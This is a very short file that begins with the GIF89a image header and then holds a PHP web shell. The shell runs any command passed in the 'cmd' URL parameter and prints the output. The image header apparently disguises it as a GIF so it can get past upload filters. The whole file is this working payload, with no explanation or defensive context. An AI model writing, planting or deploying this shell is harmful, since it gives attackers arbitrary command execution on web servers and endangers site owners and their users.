GIF89a
<?php
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    echo "<pre>";
    echo `$cmd`;
    echo "</pre>";
}
?>
